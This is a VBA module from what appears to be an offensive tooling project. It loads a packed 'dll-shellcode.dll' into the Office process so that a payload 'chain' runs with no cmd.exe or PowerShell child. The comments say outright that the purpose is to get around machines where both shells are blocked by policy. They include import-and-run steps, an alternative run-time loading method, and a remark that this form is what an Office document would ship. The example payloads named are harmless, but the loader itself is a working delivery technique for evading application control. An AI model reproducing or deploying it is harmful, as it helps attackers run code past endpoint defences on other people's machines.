Attribute VB_Name = "PicaroHost"
Option Explicit

' Office / VBA host for a `kind: dll` artifact.
'
' This is the shell-free case: Word/Excel/Outlook load the packed DLL into the
' *Office* process, in-process, with no cmd.exe, no powershell.exe and no child
' process at all. On a machine where both shells are blocked by policy but
' Office is allowed, this is the host that is left.
'
' NOT run on this repository's measurement host (no Office there). The recipe is
' the documented VBA interface; verify on the target.
'
' Install: Alt+F11 (the VBA editor) -> File -> Import File -> this .bas, then
' run `PicaroRun` from the Immediate window (Ctrl+G):  ?PicaroRun
' or from any macro:  MsgBox PicaroRun
'
' Two VBA facts that shape the code below:
'   - `Declare ... Lib` needs a **literal** path; VBA rejects a variable there.
'     Point the string at your artifact. For a run-time path, use `LoadLibraryA`
'     + `GetProcAddress` from `kernel32` and invoke the pointer with
'     `DispCallFunc`; the literal form is the short one and is what an Office
'     document would ship.
'   - `PtrSafe` and `LongPtr` are required in 64-bit Office. The artifact must
'     match Office's bitness: a 64-bit Office loads the x64 build, 32-bit Office
'     the x86 one (an in-process DLL; same rule as `System.load`).

' The name `Run` is aliased to `PicaroChain` so it cannot collide with a VBA
' procedure. The four parameters are the shape `rundll32` calls with and are all
' ignored; only the return value matters.
Private Declare PtrSafe Function PicaroChain Lib "C:\picaro\dist\dll-shellcode.dll" Alias "Run" _
    (ByVal hwnd As LongPtr, ByVal hinst As LongPtr, ByVal cmdline As String, ByVal show As Long) As Long

''' Loads the DLL (first call only) and runs the chain, returning its exit code.
''' `vbNullString` passes a NULL `cmdline`; the other arguments are ignored.
''' On x64 the return value is the chain's code (42 for
''' `examples/plans/dll-shellcode.yaml`); with `examples/plans/dll.yaml` the call
''' blocks on the payload's modal dialog and returns 0 once it is dismissed.
Public Function PicaroRun() As Long
    PicaroRun = PicaroChain(0, 0, vbNullString, 0)
End Function
